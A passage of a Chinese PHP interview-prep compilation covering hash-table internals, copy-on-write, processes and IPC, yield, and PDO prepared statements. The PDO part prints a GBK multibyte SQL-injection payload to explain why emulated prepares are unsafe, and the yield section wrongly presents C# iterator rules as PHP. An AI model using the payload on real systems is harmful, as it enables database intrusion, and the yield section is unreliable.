  zend_string   *key; // 当 key 值为字符串时，指向该字符串对应的 zend_string（使用数字索引时该值为 NULL），用于查找时 key 的比较
} Bucket;
到这里有个问题出现了：存储在散列表里的元素是无序的，PHP 数组如何做到按顺序读取的呢？

答案是中间映射表，为了实现散列表的有序性，PHP 为其增加了一张中间映射表，该表是一个大小与 Bucket 相同的数组，数组中储存整形数据，用于保存元素实际储存的 Value 在 Bucekt 中的下标。Bucekt 中的数据是有序的，而中间映射表中的数据是无序的。



而通过映射函数映射后的散列值要在中间映射表的区间内，这就对映射函数提出了要求。

映射函数
PHP7 数组采用的映射方式：

1
nIndex = h | ht->nTableMask;
将 key 经过 time33 算法生成的哈希值 h 和 nTableMask 进行或运算即可得出映射表的下标，其中 nTableMask 数值为 nTableSize 的负数。并且由于 nTableSize 的值为 2 的幂次方，所以 nTableMask 二进制位右侧全部为 0，保证了 h | ht->nTableMask 的取值范围会在 [-nTableSize, -1] 之间，正好在映射表的下标范围内。另外，用按位或运算的方法和其他方法如取余的方法相比运算速度较高，这个映射函数可以说设计的非常巧妙了。

散列（哈希）冲突
不同键名的通过映射函数计算得到的散列值有可能相同，此时便发生了散列冲突。

对于散列冲突有以下 4 种常用方法：

1.将散列值放到相邻的最近地址里

2.换个散列函数重新计算散列值

3.将冲突的散列值统一放到另一个地方

4.在冲突位置构造一个单向链表，将散列值相同的元素放到相同槽位对应的链表中。这个方法叫链地址法，PHP 数组就是采用这个方法解决散列冲突的问题。

其具体实现是：将冲突的 Bucket 串成链表，这样中间映射表映射出的就不是某一个元素，而是一个 Bucket 链表，通过散列函数定位到对应的 Bucket 链表时，需要遍历链表，逐个对比 Key 值，继而找到目标元素。而每个 Bucket 之间的链接则是将原 value 的下标保存到新 value 的 zval.u2.next 里，新 value 放在当前位置上，从而形成一个单向链表。

举个例子：

当我们访问 $arr['key'] 的过程中，假设首先通过散列运算得出映射表下标为 -2 ，然后访问映射表发现其内容指向 arData 数组下标为 1 的元素。此时我们将该元素的 key 和要访问的键名相比较，发现两者并不相等，则该元素并非我们所想访问的元素，而元素的 zval.u2.next 保存的值正是另一个具有相同散列值的元素对应 arData 数组的下标，所以我们可以不断通过 zval.u2.next 的值遍历直到找到键名相同的元素。

扩容
PHP 的数组在底层实现了自动扩容机制，当插入一个元素且没有空闲空间时，就会触发自动扩容机制，扩容后再执行插入。

扩容的过程为：

如果已删除元素所占比例达到阈值，则会移除已被逻辑删除的 Bucket，然后将后面的 Bucket 向前补上空缺的 Bucket，因为 Bucket 的下标发生了变动，所以还需要更改每个元素在中间映射表中储存的实际下标值。

如果未达到阈值，PHP 则会申请一个大小是原数组两倍的新数组，并将旧数组中的数据复制到新数组中，因为数组长度发生了改变，所以 key-value 的映射关系需要重新计算，这个步骤为重建索引。

重建散列表
在删除某一个数组元素时，会先使用标志位对该元素进行逻辑删除，即在删除 value 时只是将 value 的 type 设置为 IS_UNDEF，而不会立即删除该元素所在的 Bucket，因为如果每次删除元素立刻删除 Bucket 的话，每次都需要进行排列操作，会造成不必要的性能开销。

所以，当删除元素达到一定数量或扩容后都需要重建散列表，即移除被标记为删除的 value。因为 value 在 Bucket 位置移动了或哈希数组 nTableSize 变化了导致 key 与 value 的映射关系改变，重建过程就是遍历 Bucket 数组中的 value，然后重新计算映射值更新到散列表。
```

### Copy on write 原理，何时 GC
```
https://www.jb51.net/article/50079.htm
什么是写时复制（Copy On Write）？

答：在复制一个对象的时候并不是真正的把原先的对象复制到内存的另外一个位置上，而是在新对象的内存映射表中设置一个指针，指向源对象的位置，并把那块内存的Copy-On-Write位设置为1.这样，在对新的对象执行读操作的时候，内存数据不发生任何变动，直接执行读操作；而在对新的对象执行写操作时，将真正的对象复制到新的内存地址中，并修改新对象的内存映射表指向这个新的位置，并在新的内存位置上执行写操作。

这个技术需要跟虚拟内存和分页同时使用，好处就是在执行复制操作时因为不是真正的内存复制，而只是建立了一个指针，因而大大提高效率。但这不是一直成立的，如果在复制新对象之后，大部分对象都还需要继续进行写操作会产生大量的分页错误，得不偿失。所以COW高效的情况只是在复制新对象之后，在一小部分的内存分页上进行写操作。

在PHP 内核中同样使用了写时复制机制来避免在赋值时导致内存增加，比如我们在使用foreach循环体时，可以发现其中的奥秘，示例代码：

复制代码代码如下:

$m1 = memory_get_usage();
$str=<<<EOF
aaaaaaaaaaaaaa
aaaaaaaaaaaaaa
aaaaaaaaaaaaaa
EOF;
$arr = explode("\n", $str);
$count=0;
foreach($arr as $v){
    $count++;
    //$v='aaaaaaaaaaaaaa';
}
$m2 = memory_get_usage();
echo $m2-$m1;
当我们执行此代码时会得到内存占用为：788

复制代码代码如下:

$m1 = memory_get_usage();
$str=<<<EOF
aaaaaaaaaaaaaa
aaaaaaaaaaaaaa
aaaaaaaaaaaaaa
EOF;
$arr = explode("\n", $str);
$count=0;
foreach($arr as $v){
$count++;
$v='aaaaaaaaaaaaaa';
}
$m2 = memory_get_usage();
echo $m2-$m1;
当我们取消 //$v='aaaaaaaaaaaaaa';  的注释，此时内存占用数值为：840，注意内存增长了。

复制代码代码如下:

$m1 = memory_get_usage();
$str=<<<EOF
aaaaaaaaaaaaaa
aaaaaaaaaaaaaa
aaaaaaaaaaaaaa
EOF;
$arr = explode("\n", $str);
$count=0;
foreach($arr as &$v){
$count++;
//$v='aaaaaaaaaaaaaa';
}
$m2 = memory_get_usage();
echo $m2-$m1;
当我们将foreach中的$v 改写为 &$v 时，不管是否注释循环体中对$v的注释，我们都可以得到内存占用为：788

这里就说明了COW机制的介入，当我们在foreach循环中纯粹的只用到对$v 的读操作时，PHP内核会将$v这个变量的内存地址指向到$arr中数组这一索引的内存地址，并没有将数组中的数据复制一份给到变量$v，此时内存占用情况和使用&$v 是一样的。但当我们在循环体内对$v进行写操作时，写时复制机制就被激活了，此时PHP会重新开辟一段内存空间给到$v变量，而将原先$v指向数组的内存地址给断开了，此时内存必然就会增长了。

这里可以得出另外一个结论：当我们在读取大数据的时候，要注意COW机制引入的内存增长影响，同样避免不必要的对变量写，可以提高代码运行性能。

https://segmentfault.com/a/1190000014024336
PHP写时复制（Copy On Write）
php
发布于 2018-03-27
从一个例子说起：

<?php
$foo = 1;
$bar = $foo;
echo $foo + $bar;
变量 $foo 赋值给变量 $bar，这两个变量具有相同的值，没有必要新申请内存空间，他们可以共享同一块内存。在很多场景下PHP 的 COW 对内存进行优化。比如：变量的多次赋值、函数参数传递，并在函数体内修改实参等。

什么是“复制”
这是一段摘自鸟哥博客的例子，说的比较清楚，就直接贴过来了。

<?php
   $var = "laruence";
   $var_dup = $var;
   $var = 1;
?>
很明显在这段代码执行以后，$var_dup 的值应该还是”laruence”, 那么这又是怎么实现的呢？这就是 PHP 的 copy on write 机制：

PHP 在修改一个变量以前，会首先查看这个变量的 refcount，如果 refcount 大于1，PHP 就会执行一个分离的例程， 对于上面的代码，当执行到第三行的时候，PHP 发现 $var 指向的 zval 的 refcount 大于1，那么 PHP 就会复制一个新的 zval 出来，将原 zval 的 refcount 减 1，并修改 symbol_table，使得 $var 和 $var_dup 分离(Separation)。这个机制就是所谓的 copy on write(写时复制)。

写时复制应用场景
写时复制（Copy on Write，也缩写为COW)的应用场景非常多， 比如Linux中对进程复制中内存使用的优化，在各种编程语言中，如C++的STL等等中均有类似的应用。 COW是常用的优化手段，可以归类于：资源延迟分配。只有在真正需要使用资源时才占用资源， 写时复制通常能减少资源的占用。

一个证明 PHP COW 优化内存占用的例子：

<?php
$j = 1;
var_dump(memory_get_usage());
 
$tipi = array_fill(0, 100000, 'php-internal');
var_dump(memory_get_usage());
 
$tipi_copy = $tipi;
var_dump(memory_get_usage());
 
foreach ($tipi_copy as $i) {
    $j += count($i);
}
var_dump(memory_get_usage());
运行结果：

$ php t . php
int(630904)
int(10479840)
int(10479944)
int(10480040)
内存并没有显著提高。

“写时复制”的原理
多个相同值的变量共用同一块内存的确节省了内存空间，但变量的值是会发生变化的，如果在上面的例子中， 指向同一内存的值发生了变化（或者可能发生变化），就需要将变化的值“分离”出去，这个“分离”的操作， 就是“复制”。

在PHP中，Zend引擎为了区别同一个zval地址是否被多个变量共享，引入了ref_count和is_ref两个变量进行标识：

ref_count和is_ref是定义于zval结构体中

is_ref标识是不是用户使用 & 的强制引用；

ref_count是引用计数，用于标识此zval被多少个变量引用，即COW的自动引用，为0时会被销毁；

注：由此可见， $a=$b; 与 $a=&$b; 在PHP对内存的使用上没有区别（值不变化时）；

相信大家也可以了解到PHP中COW的实现原理： PHP 中的 COW 基于引用计数ref_count 和 is_ref 实现， 多一个变量指针，就将 ref_count 加 1， 反之减去 1，减到 0 就销毁； 同理，多一个强制引用 &,就将 is_ref 加 1，反之减去 1。

clipboard.png

讲堂报名地址：https://segmentfault.com/l/15...

PHP笔试面试题精选（二）
课程简述
《PHP笔试面试题精选》课程系列分享关于 PHP 笔试面试会问到的一些问题和知识点，围绕 PHP、数据库、计算机网络、计算机操作系统、设计模式、WEB安全等多个方面进行。

课程内容
由于涉及到的问题和知识点比较多，本期主要讲 PHP基础、WEB安全、计算机网络三个方面有关的问题。

PHP基础方面
PSR规范
PHP新特性
PHP_FPM性能调优
Session垃圾回收机制
WEB安全
XSS攻击原理和防范
CSRF攻击原理和防范
SQL注入攻击防范
密码哈希
计算机网络
HTTP协议
TCP/IP协议
WebSocket连接过程

```

### PHP 进程模型，进程通讯方式，进程线程区别
```
http://www.gxlcms.com/PHPjiqiao-378142.html
PHP进程模型、进程通讯方式、进程线程的区别分别有哪些？
PHP进程模型是一个正在执行的程序，可以分配给处理器并由处理器执行的一个实体；PHP进程通讯方式有管道及有名管道，信号，共享内存等；PHP进程线程的区别有进程是资源的分配和调度的一个独立单元，而线程是CPU调度的基本单元等。



PHP进程模型、进程通讯方式、进程线程的区别分别是：

一、PHP进程模型

进程的概念是操作系统的结构的基础。Multics的设计者在20世纪60年代首次使用了这个技术词语,它比作业更通用一些。关于进程的定义，如下所示：

1、一个正在执行的程序。

2、计算机中正在运行的程序的一个实例。

3、可以分配给处理器并由处理器执行的一个实体。

4、由单一的顺序的执行线程、一个当前状态和一组相关的系统资源所描述的活动单元。

相关学习推荐：PHP编程从入门到精通

二、进程与线程区别

进程是资源分配的基本单位。所有与该进程有关的资源，都被记录在进程控制块PCB中。以表示该进程拥有这些资源或正在使用它们。

另外，进程也是抢占处理机的调度单位，它拥有一个完整的虚拟地址空间。当进程发生调度时，不同的进程拥有不同的虚拟地址空间，而同一进程内的不同线程共享同一地址空间。

与进程相对应，线程与资源分配无关，它属于某一个进程，并与进程内的其他线程一起共享进程的资源。

线程只由相关堆栈（系统栈或用户栈）寄存器和线程控制表TCB组成。寄存器可被用来存储线程内的局部变量，但不能存储其他线程的相关变量。

通常在一个进程中可以包含若干个线程，它们可以利用进程所拥有的资源。在引入线程的操作系统中，通常都是把进程作为分配资源的基本单位，而把线程作为独立运行和独立调度的基本单位。由于线程比进程更小，基本上不拥有系统资源，故对它的调度所付出的开销就会小得多，能更高效的提高系统内多个程序间并发执行的程度，从而显著提高系统资源的利用率和吞吐量。因而近年来推出的通用操作系统都引入了线程，以便进一步提高系统的并发性，并把它视为现代操作系统的一个重要指标。

线程与进程的区别可以归纳为以下4点：

（1）进程是资源的分配和调度的一个独立单元，而线程是CPU调度的基本单元

（2）同一个进程中可以包括多个线程，并且线程共享整个进程的资源（寄存器、堆栈、上下文），一个进行至少包括一个线程。

（3）进程的创建调用fork或者vfork，而线程的创建调用pthread_create，进程结束后它拥有的所有线程都将销毁，而线程的结束不会影响同个进程中的其他线程的结束

（4）线程是轻量级的进程，它的创建和销毁所需要的时间比进程小很多，所有操作系统中的执行功能都是创建线程去完成的

（5）线程中执行时一般都要进行同步和互斥，因为他们共享同一进程的所有资源

（6）线程有自己的私有属性TCB，线程id，寄存器、硬件上下文，而进程也有自己的私有属性进程控制块PCB，这些私有属性是不被共享的，用来标示一个进程或一个线程的标志

三、进程间通信方式

1、管道（Pipe）及有名管道（named pipe）：管道可用于具有亲缘关系进程间的通信，有名管道克服了管道没有名字的限制，因此，除具有管道所具有的功能外，它还允许无亲缘关系进程间的通信；

2、信号（Signal）：信号是比较复杂的通信方式，用于通知接受进程有某种事件发生，除了用于进程间通信外，进程还可以发送信号给进程本身；linux除了支持Unix早期信号语义函数sigal外，还支持语义符合Posix.1标准的信号函数sigaction（实际上，该函数是基于BSD的，BSD为了实现可靠信号机制，又能够统一对外接口，用sigaction函数重新实现了signal函数）；

3、报文（Message）队列（消息队列）：消息队列是消息的链接表，包括Posix消息队列system V消息队列。有足够权限的进程可以向队列中添加消息，被赋予读权限的进程则可以读走队列中的消息。消息队列克服了信号承载信息量少，管道只能承载无格式字节流以及缓冲区大小受限等缺点。

4、共享内存：使得多个进程可以访问同一块内存空间，是最快的可用IPC形式。是针对其他通信机制运行效率较低而设计的。往往与其它通信机制，如信号量结合使用，来达到进程间的同步及互斥。

信号量（semaphore）：主要作为进程间以及同一进程不同线程之间的同步手段。

5、套接口（Socket）：更为一般的进程间通信机制，可用于不同机器之间的进程间通信。起初是由Unix系统的BSD分支开发出来的，但现在一般可以移植到其它类Unix系统上：Linux和System V的变种都支持套接字。
```

### yield 核心原理是什么
```
https://www.php.cn/faq/453725.html
yield核心原理是在迭代器块中用于向枚举数对象提供值或发出迭代结束信号，其语句只能出现在iterator块中，该块可用作方法、运算符或访问器的体。



yield核心原理是：

在迭代器块中用于向枚举数对象提供值或发出迭代结束信号。

它的形式为下列之一：

复制代码yield return ;yield break;

备注计算表达式并以枚举数对象值的形式返回；

expression 必须可以隐式转换为迭代器的 yield 类型。

yield 语句只能出现在 iterator 块中，该块可用作方法、运算符或访问器的体。

这类方法、运算符或访问器的体受以下约束的控制：

不允许不安全块。

方法、运算符或访问器的参数不能是 ref 或 out。

yield 语句不能出现在匿名方法中。

当和 expression 一起使用时，yield return 语句不能出现在 catch 块中或含有一个或多个 catch 子句的 try 块中。示例在下面的示例中，迭代器块（这里是方法 Power(int number, int power)）中使用了 yield 语句。当调用 Power 方法时，它返回一个包含数字幂的可枚举对象。

注意 Power 方法的返回类型是 IEnumerable（一种迭代器接口类型）。

```

### PDO prepare 原理
```
https://www.cnblogs.com/DataArt/p/10240829.html
Prepare的好处 
    Prepare SQL产生的原因。首先从mysql服务器执行sql的过程开始讲起，SQL执行过程包括以下阶段 词法分析->语法分析->语义分析->执行计划优化->执行。词法分析->语法分析这两个阶段我们称之为硬解析。词法分析识别sql中每个词，语法分析解析SQL语句是否符合sql语法，并得到一棵语法树（Lex）。对于只是参数不同，其他均相同的sql，它们执行时间不同但硬解析的时间是相同的。而同一SQL随着查询数据的变化，多次查询执行时间可能不同，但硬解析的时间是不变的。对于sql执行时间较短，sql硬解析的时间占总执行时间的比率越高。而对于淘宝应用的绝大多数事务型SQL，查询都会走索引，执行时间都比较短。因此淘宝应用db sql硬解析占的比重较大。 

    Prepare的出现就是为了优化硬解析的问题。Prepare在服务器端的执行过程如下

 1）  Prepare 接收客户端带”?”的sql, 硬解析得到语法树(stmt->Lex), 缓存在线程所在的preparestatement cache中。此cache是一个HASH MAP. Key为stmt->id. 然后返回客户端stmt->id等信息。

 2）  Execute 接收客户端stmt->id和参数等信息。注意这里客户端不需要再发sql过来。服务器根据stmt->id在preparestatement cache中查找得到硬解析后的stmt, 并设置参数，就可以继续后面的优化和执行了。

    Prepare在execute阶段可以节省硬解析的时间。如果sql只执行一次，且以prepare的方式执行，那么sql执行需两次与服务器交互（Prepare和execute）, 而以普通（非prepare）方式，只需要一次交互。这样使用prepare带来额外的网络开销，可能得不偿失。我们再来看同一sql执行多次的情况，比如以prepare方式执行10次，那么只需要一次硬解析。这时候  额外的网络开销就显得微乎其微了。因此prepare适用于频繁执行的SQL。

    Prepare的另一个作用是防止sql注入，不过这个是在客户端jdbc通过转义实现的，跟服务器没有关系。 

硬解析的比重
   压测时通过perf 得到的结果，硬解析相关的函数比重都比较靠前（MYSQLparse 4.93%, lex_one_token 1.79%, lex_start 1.12%）总共接近8%。因此，服务器使用prepare是可以带来较多的性能提升的。

jdbc与prepare 
  jdbc服务器端的参数：

   useServerPrepStmts：默认为false. 是否使用服务器prepare开关

  jdbc客户端参数：

   cachePrepStmts：默认false.是否缓存prepareStatement对象。每个连接都有一个缓存，是以sql为唯一标识的LRU cache. 同一连接下，不同stmt可以不用重新创建prepareStatement对象。

   prepStmtCacheSize：LRU cache中prepareStatement对象的个数。一般设置为最常用sql的个数。

   prepStmtCacheSqlLimit：prepareStatement对象的大小。超出大小不缓存。

  Jdbc对prepare的处理过程： 

  useServerPrepStmts=true时Jdbc对prepare的处理

   1）  创建PreparedStatement对象，向服务器发送COM_PREPARE命令，并传送带问号的sql. 服务器返回jdbc stmt->id等信息

   2）  向服务器发送COM_EXECUTE命令,并传送参数信息。

  useServerPrepStmts=false时Jdbc对prepare的处理

   1）  创建PreparedStatement对象，此时不会和服务器交互。

   2） 根据参数和PreparedStatement对象拼接完整的SQL，向服务器发送QUERY命令

   我们再看参数cachePrepStmts打开时在useServerPrepStmts为true或false时，均缓存PreparedStatement对象。只不过useServerPrepStmts为的true缓存PreparedStatement对象包含服务器的stmt->id等信息，也就是说如果重用了PreparedStatement对象，那么就省去了和服务器通讯（COM_PREPARE命令）的开销。而useServerPrepStmts=false是，开启cachePrepStmts缓存PreparedStatement对象只是简单的sql解析信息，因此此时开启cachePrepStmts意义不是太大。

我们来开看一段java代码         

复制代码
 
            Connection con = null;
            PreparedStatement ps = null;
            String sql = "select * from user where id=?";
            ps = con.prepareStatement(sql);            
            ps.setInt(1, 1);‍‍            
            ps.executeQuery();            
            ps.close();            
            ps = con.prepareStatement(sql);            
            ps.setInt(1, 3);            
            ps.executeQuery();            
            ps.close();
 
复制代码
    这段代码在同一会话中两次prepare执行同一语句，并且之间有ps.close();

    useServerPrepStmts=false时，服务器会两次硬解析同一SQL。

    useServerPrepStmts=true, cachePrepStmts=false时服务器仍然会两次硬解析同一SQL。

    useServerPrepStmts=true, cachePrepStmts=true时服务器只会硬解析一次SQL。

 

    如果两次prepare之间没有ps.close();那么cachePrepStmts=true，cachePrepStmts=false也只需一次硬解析. 

    因此，客户端对同一sql,频繁分配和释放PreparedStatement对象的情况下，开启cachePrepStmts参数是很有必要的。

测试
   1)做了一个简单的测试，主要测试prepare的效果和useServerPrepStmts参数的影响.       

复制代码
 
        cnt = 5000;
        // no prepare
        String sql = "select biz_order_id,out_order_id,seller_nick,buyer_nick,seller_id,buyer_id,auction_id,auction_title,auction_price,buy_amount,biz_type,sub_biz_type,fail_reason,pay_status,logistics_status,out_trade_status,snap_path,gmt_create,status,ifnull(buyer_rate_status, 4) buyer_rate_status from tc_biz_order_0030 where " +
        "parent_id = 594314511722841 or parent_id =547667559932641;";

        begin = new Date();
        System.out.println("begin:" + df.format(begin));
        
        stmt = con.createStatement();
        for (int i = 0; i < cnt; i++)
        {            
            stmt.executeQuery(sql);
        } 
               
        end = new Date();
        System.out.println("end:" + df.format(end));
        
        long temp = end.getTime() - begin.getTime();
        System.out.println("no perpare interval:" + temp);
        
        
        // test prepare       
        sql = "select biz_order_id,out_order_id,seller_nick,buyer_nick,seller_id,buyer_id,auction_id,auction_title,auction_price,buy_amount,biz_type,sub_biz_type,fail_reason,pay_status,logistics_status,out_trade_status,snap_path,gmt_create,status,ifnull(buyer_rate_status, 4) buyer_rate_status from tc_biz_order_0030 where " +
                "parent_id = 594314511722841 or parent_id =?;";
        ps = con.prepareStatement(sql);
        BigInteger param = new BigInteger("547667559932641");
        
        begin = new Date();
        System.out.println("begin:" + df.format(begin));
        
        for (int i = 0; i < cnt; i++)
        {
            ps.setObject(1, param);
            ps.executeQuery(); 
        } 
   
        end = new Date();
        System.out.println("end:" + df.format(end));
        
        temp = end.getTime() - begin.getTime();
        System.out.println("prepare interval:" + temp);
 
复制代码
经多次采样测试结果如下
 	非prepare和prepare时间比
useServerPrepStmts=true	0.93
useServerPrepStmts=false	1.01
 

结论：

useServerPrepStmts=true时，prepare提升7%；

useServerPrepStmts=false时，prepare与非prepare性能相当。 

 

如果将语句简化为select * from tc_biz_order_0030 where parent_id =?。那么测试的结论useServerPrepStmts=true时，prepare仅提升2%；sql越简单硬解析的时间就越少，prepare的提升就越少。

 

注意：这个测试是在单个连接，单条sql的理想情况下进行的，线上会出现多连接多sql,还有sql执行频率，sql的复杂程度等不同，因此prepare的提升效果会随具体环境而变化。 

2）prepare 前后的perf top 对比 

   以下为非prepare    

复制代码
 
     6.46%   mysqld  mysqld              [.] _Z10MYSQLparsePv
     3.74%   mysqld  libc-2.12.so        [.] __memcpy_ssse3
     2.50%   mysqld  mysqld              [.] my_hash_sort_utf8
     2.15%   mysqld  mysqld              [.] cmp_dtuple_rec_with_match
     2.05%   mysqld  mysqld              [.] _ZL13lex_one_tokenPvS_
     1.46%   mysqld  mysqld              [.] buf_page_get_gen
     1.34%   mysqld  mysqld              [.] page_cur_search_with_match
     1.31%   mysqld  mysqld              [.] _ZL14build_templateP19row_prebuilt_structP3THDP5TABLEj
     1.24%   mysqld  mysqld              [.] rec_init_offsets
     1.11%   mysqld  libjemalloc.so.1    [.] free
     1.09%   mysqld  mysqld              [.] rec_get_offsets_func
     1.01%   mysqld  libjemalloc.so.1    [.] malloc
     0.96%   mysqld  libc-2.12.so        [.] __strlen_sse42
     0.93%   mysqld  mysqld              [.] _ZN4JOIN8optimizeEv
     0.91%   mysqld  mysqld              [.] _ZL15get_hash_symbolPKcjb
     0.88%   mysqld  mysqld              [.] row_search_for_mysql
     0.86%   mysqld  [kernel.kallsyms]   [k] tcp_recvmsg    
 
复制代码
 

 以下为perpare    

复制代码
 
     3.46%   mysqld  libc-2.12.so        [.] __memcpy_ssse3
     2.32%   mysqld  mysqld              [.] cmp_dtuple_rec_with_match
     2.14%   mysqld  mysqld              [.] _ZL14build_templateP19row_prebuilt_structP3THDP5TABLEj
     1.96%   mysqld  mysqld              [.] buf_page_get_gen
     1.66%   mysqld  mysqld              [.] page_cur_search_with_match
     1.54%   mysqld  mysqld              [.] row_search_for_mysql
     1.44%   mysqld  mysqld              [.] btr_cur_search_to_nth_level
     1.41%   mysqld  libjemalloc.so.1    [.] free
     1.35%   mysqld  mysqld              [.] rec_init_offsets
     1.32%   mysqld  [kernel.kallsyms]   [k] kfree
     1.14%   mysqld  libjemalloc.so.1    [.] malloc
     1.08%   mysqld  [kernel.kallsyms]   [k] fget_light
     1.05%   mysqld  mysqld              [.] rec_get_offsets_func
     0.99%   mysqld  mysqld              [.] _ZN8Protocol24send_result_set_metadataEP4ListI4ItemEj
     0.90%   mysqld  mysqld              [.] sync_array_print_long_waits
     0.87%   mysqld  mysqld              [.] page_rec_get_n_recs_before
     0.81%   mysqld  mysqld              [.] _ZN4JOIN8optimizeEv
     0.81%   mysqld  libc-2.12.so        [.] __strlen_sse42
     0.78%   mysqld  mysqld              [.] _ZL20make_join_statisticsP4JOINP10TABLE_LISTP4ItemP16st_dynamic_array
     0.72%   mysqld  [kernel.kallsyms]   [k] tcp_recvmsg
     0.63%   mysqld  libpthread-2.12.so  [.] __pthread_getspecific_internal
     0.63%   mysqld  [kernel.kallsyms]   [k] sk_run_filter
     0.60%   mysqld  mysqld              [.] _Z19find_field_in_tableP3THDP5TABLEPKcjbPj
     0.60%   mysqld  mysqld              [.] page_check_dir
     0.57%   mysqld  mysqld              [.] _Z16dispatch_command19enum_server_commandP3THDP
 
复制代码
    对比可以发现 MYSQLparse lex_one_token在prepare时已优化掉了。

思考
   1 开启cachePrepStmts的问题，前面谈到每个连接都有一个缓存，是以sql为唯一标识的LRU cache. 在分表较多，大连接的情况下，可能会个应用服务器带来内存问题。这里有个前提是ibatis是默认使用prepare的。 在mybatis中，标签statementType可以指定某个sql是否是使用prepare.

statementType Any one of STATEMENT, PREPARED or CALLABLE. This causes MyBatis to use Statement, PreparedStatement orCallableStatement respectively. Default: PREPARED.

这样可以精确控制只对频率较高的sql使用prepare，从而控制使用prepare sql的个数，减少内存消耗。遗憾的是目前集团貌似大多使用的是ibatis 2.0版本，不支持statementType

标签。

    2 服务器端prepare cache是一个HASH MAP. Key为stmt->id,同时也是每个连接都维护一个。因此也有可能出现内存问题，待实际测试。如有必要需改造成Key为sql的全局cache，这样不同连接的相同prepare sql可以共享。 

    3 oracle prepare与mysql prepare的区别：

      mysql与oracle有一个重大区别是mysql没有oracle那样的执行计划缓存。前面我们讲到SQL执行过程包括以下阶段 词法分析->语法分析->语义分析->执行计划优化->执行。oracle的prepare实际上包括以下阶段：词法分析->语法分析->语义分析->执行计划优化，也就是说oracle的prepare做了更多的事情，execute只需要执行即可。因此，oracle的prepare比mysql更高效。
https://www.jb51.net/article/56612.htm
我们都知道，只要合理正确使用PDO,可以基本上防止SQL注入的产生，本文主要回答以下两个问题：
为什么要使用PDO而不是mysql_connect？
为何PDO能防注入？
使用PDO防注入的时候应该特别注意什么?
 
一、为何要优先使用PDO?

PHP手册上说得很清楚：
Prepared statements and stored procedures
Many of the more mature databases support the concept of prepared statements. What are they? They can be thought of as a kind of compiled template for the SQL that an application wants to run, that can be customized using variable parameters. Prepared statements offer two major benefits:

The query only needs to be parsed (or prepared) once, but can be executed multiple times with the same or different parameters. When the query is prepared, the database will analyze, compile and optimize its plan for executing the query. For complex queries this process can take up enough time that it will noticeably slow down an application if there is a need to repeat the same query many times with different parameters. By using a prepared statement the application avoids repeating the analyze/compile/optimize cycle. This means that prepared statements use fewer resources and thus run faster.
 

The parameters to prepared statements don't need to be quoted; the driver automatically handles this. If an application exclusively uses prepared statements, the developer can be sure that no SQL injection will occur (however, if other portions of the query are being built up with unescaped input, SQL injection is still possible).
 
即使用PDO的prepare方式，主要是提高相同SQL模板查询性能、阻止SQL注入
同时，PHP手册中给出了警告信息
Prior to PHP 5.3.6, this element was silently ignored. The same behaviour can be partly replicated with the PDO::MYSQL_ATTR_INIT_COMMAND driver option, as the following example shows.
Warning
The method in the below example can only be used with character sets that share the same lower 7 bit representation as ASCII, such as ISO-8859-1 and UTF-8. Users using character sets that have different representations (such as UTF-16 or Big5) must use the charset option provided in PHP 5.3.6 and later versions.
 
意思是说，在PHP 5.3.6及以前版本中，并不支持在DSN中的charset定义，而应该使用PDO::MYSQL_ATTR_INIT_COMMAND设置初始SQL, 即我们常用的 set names gbk指令。
 
我看到一些程序，还在尝试使用addslashes达到防注入的目的，殊不知这样其实问题更多, 详情请看https://www.jb51.net/article/49205.htm
还有一些做法：在执行数据库查询前，将SQL中的select, union, ....之类的关键词清理掉。这种做法显然是非常错误的处理方式，如果提交的正文中确实包含 the students's union , 替换后将篡改本来的内容，滥杀无辜，不可取。
 
二、为何PDO能防SQL注入？
请先看以下PHP代码：
复制代码代码如下:
<?php
$pdo = new PDO("mysql:host=192.168.0.1;dbname=test;charset=utf8","root");
$st = $pdo->prepare("select * from info where id =? and name = ?");
 
$id = 21;
$name = 'zhangsan';
$st->bindParam(1,$id);
$st->bindParam(2,$name);
 
$st->execute();
$st->fetchAll();
?>

 
环境如下：
PHP 5.4.7
Mysql 协议版本 10
MySQL Server 5.5.27
 
为了彻底搞清楚php与mysql server通讯的细节，我特别使用了wireshark抓包进行研究之,安装wireshak之后，我们设置过滤条件为tcp.port==3306, 如下图：
 
 
 
如此只显示与mysql 3306端口的通信数据，避免不必要的干扰。
特别要注意的是wireshak基于wincap驱动，不支持本地环回接口的侦听（即使用php连接本地mysql的方法是无法侦听的），请连接其它机器（桥接网络的虚拟机也可）的MySQL进行测试。
 
然后运行我们的PHP程序，侦听结果如下，我们发现，PHP只是简单地将SQL直接发送给MySQL Server :
 
 
 
其实，这与我们平时使用mysql_real_escape_string将字符串进行转义，再拼接成SQL语句没有差别（只是由PDO本地驱动完成转义的），显然这种情况下还是有可能造成SQL注入的，也就是说在php本地调用pdo prepare中的mysql_real_escape_string来操作query，使用的是本地单字节字符集，而我们传递多字节编码的变量时，有可能还是会造成SQL注入漏洞(php 5.3.6以前版本的问题之一，这也就解释了为何在使用PDO时，建议升级到php 5.3.6+，并在DSN字符串中指定charset的原因。
 
针对php 5.3.6以前版本，以下代码仍然可能造成SQL注入问题：
复制代码代码如下:
$pdo->query('SET NAMES GBK');
$var = chr(0xbf) . chr(0x27) . " OR 1=1 /*";
$query = "SELECT * FROM info WHERE name = ?";
$stmt = $pdo->prepare($query);
$stmt->execute(array($var));

 
原因与上面的分析是一致的。
 
而正确的转义应该是给mysql Server指定字符集，并将变量发送给MySQL Server完成根据字符转义。
 
那么，如何才能禁止PHP本地转义而交由MySQL Server转义呢？
PDO有一项参数，名为PDO::ATTR_EMULATE_PREPARES ，表示是否使用PHP本地模拟prepare，此项参数默认值未知。而且根据我们刚刚抓包分析结果来看，php 5.3.6+默认还是使用本地变量转，拼接成SQL发送给MySQL Server的，我们将这项值设置为false, 试试效果，如以下代码：
复制代码代码如下:
<?php
$pdo = new PDO("mysql:host=192.168.0.1;dbname=test;","root");
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);//这是我们刚加入的内容
 
$st = $pdo->prepare("select * from info where id =? and name = ?");
$id = 21;
$name = 'zhangsan';
 
$st->bindParam(1,$id);
$st->bindParam(2,$name);
$st->execute();
$st->fetchAll();
?>

 
运行一下程序，使用wireshark抓包分析，得出的结果如下：




看到了吗？这就是神奇之处，可见这次PHP是将SQL模板和变量是分两次发送给MySQL的，由MySQL完成变量的转义处理，既然变量和SQL模板是分两次发送的，那么就不存在SQL注入的问题了，但需要在DSN中指定charset属性，如：
复制代码代码如下:
$pdo = new PDO('mysql:host=localhost;dbname=test;charset=utf8', 'root');

 
如此，即可从根本上杜绝SQL注入的问题。如果你对此不是很清楚，可以发邮件至zhangxugg@163.com, 一起探讨。
 
三、使用PDO的注意事项
